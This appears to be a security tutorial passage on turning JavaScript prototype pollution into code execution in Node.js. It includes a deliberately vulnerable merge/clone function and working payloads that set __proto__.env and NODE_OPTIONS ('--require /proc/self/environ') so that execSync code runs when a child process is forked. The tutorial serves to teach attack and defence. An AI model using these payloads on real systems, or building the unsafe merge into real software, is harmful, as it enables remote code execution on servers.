Vulnerable Code
Imagine a real JS using some code like the following one:
const { execSync, fork } = require("child_process")

function isObject(obj) {
  console.log(typeof obj)
  return typeof obj === "function" || typeof obj === "object"
}

// Function vulnerable to prototype pollution
function merge(target, source) {
  for (let key in source) {
    if (isObject(target[key]) && isObject(source[key])) {
      merge(target[key], source[key])
    } else {
      target[key] = source[key]
    }
  }
  return target
}

function clone(target) {
  return merge({}, target)
}

// Run prototype pollution with user input
// Check in the next sections what payload put here to execute arbitrary code
clone(USERINPUT)

// Spawn process, this will call the gadget that poputales env variables
// Create an a_file.js file in the current dir: `echo a=2 > a_file.js`
var proc = fork("a_file.js")
PP2RCE via env vars
PP2RCE
means
Prototype Pollution to RCE
(Remote Code Execution).
According to this
writeup
when a
process is spawned
with some method from
child_process
(like
fork
or
spawn
or others) it calls the method
normalizeSpawnArguments
which a
prototype pollution gadget to create new env vars
:
//See code in https://github.com/nodejs/node/blob/02aa8c22c26220e16616a88370d111c0229efe5e/lib/child_process.js#L638-L686

var env = options.env || process.env;
var envPairs = [];
[...]
let envKeys = [];
// Prototype values are intentionally included.
for (const key in env) {
  ArrayPrototypePush(envKeys, key);
}
[...]
for (const key of envKeys) {
  const value = env[key];
  if (value !== undefined) {
    ArrayPrototypePush(envPairs, `${key}=${value}`); // <-- Pollution
  }
}
Check that code you can see itâs possible en
poison
envPairs
just by
polluting
the
attribute
.env
.
Poisoning
__proto__
Warning
Note that due to how the
normalizeSpawnArguments
function from the
child_process
library of node works, when something is called in order to
set a new env variable
for the process you just need to
pollute anything
.
For example, if you do
__proto__.avar="valuevar"
the process will be spawned with a var called
avar
with value
valuevar
.
However, in order for the
env variable to be the first one
you need to
pollute
the
.env
attribute
and (only in some methods) that var will be the
first one
(allowing the attack).
Thatâs why
NODE_OPTIONS
is
not inside
.env
in the following attack.
const { execSync, fork } = require("child_process")

// Manual Pollution
b = {}
b.__proto__.env = {
  EVIL: "console.log(require('child_process').execSync('touch /tmp/pp2rce').toString())//",
}
b.__proto__.NODE_OPTIONS = "--require /proc/self/environ"

// Trigger gadget
var proc = fork("./a_file.js")
// This should create the file /tmp/pp2rec

// Abusing the vulnerable code
USERINPUT = JSON.parse(
  '{"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ", "env": { "EVIL":"console.log(require(\\"child_process\\").execSync(\\"touch /tmp/pp2rce\\").toString())//"}}}'
)

clone(USERINPUT)

var proc = fork("a_file.js")
// This should create the file /tmp/pp2rec
